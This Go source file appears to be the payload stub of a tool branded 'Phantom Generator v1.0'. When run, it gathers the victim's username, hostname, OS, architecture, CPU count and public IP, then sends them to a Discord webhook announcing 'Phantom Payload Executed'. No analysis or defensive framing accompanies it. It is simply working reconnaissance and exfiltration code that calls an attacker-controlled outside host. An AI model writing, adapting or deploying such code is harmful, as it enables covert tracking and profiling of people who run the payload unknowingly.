package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"runtime"
)

// WebhookPayload represents the JSON payload for Discord webhook
type WebhookPayload struct {
	Content string                  `json:"content"`
	Embeds  []map[string]interface{} `json:"embeds"`
}

var (
	WebhookURL string
	Timestamp  string
)

func main() {
	if WebhookURL == "" {
		return
	}

	// Gather system information
	systemInfo := gatherSystemInfo()

	// Send to Discord webhook
	sendToDiscord(WebhookURL, systemInfo)
}

func getPublicIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown"
	}
	return string(ip)
}

func gatherSystemInfo() map[string]interface{} {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()
	ip := getPublicIP()

	return map[string]interface{}{
		"username":  currUser.Username,
		"hostname":  hostname,
		"os":        runtime.GOOS,
		"arch":      runtime.GOARCH,
		"timestamp": Timestamp,
		"ip":        ip,
		"cpus":      runtime.NumCPU(),
	}
}

func sendToDiscord(webhookURL string, data map[string]interface{}) {
	payload := WebhookPayload{
		Content: "👻 **Phantom Payload Executed**",
		Embeds: []map[string]interface{}{
			{
				"title": "System Information",
				"color": 0x7289da,
				"fields": []map[string]interface{}{
					{
						"name":   "👤 User",
						"value":  fmt.Sprintf("`%v`", data["username"]),
						"inline": true,
					},
					{
						"name":   "💻 Hostname",
						"value":  fmt.Sprintf("`%v`", data["hostname"]),
						"inline": true,
					},
					{
						"name":   "🌐 Public IP",
						"value":  fmt.Sprintf("`%v`", data["ip"]),
						"inline": true,
					},
					{
						"name":   "🖥️ OS",
						"value":  fmt.Sprintf("`%v (%v)`", data["os"], data["arch"]),
						"inline": true,
					},
					{
						"name":   "⚙️ CPUs",
						"value":  fmt.Sprintf("`%v`", data["cpus"]),
						"inline": true,
					},
					{
						"name":   "🕒 Generated At",
						"value":  fmt.Sprintf("`%v`", data["timestamp"]),
						"inline": false,
					},
				},
				"footer": map[string]string{
					"text": "Phantom Generator v1.0",
				},
			},
		},
	}

	jsonPayload, _ := json.Marshal(payload)
	http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
}
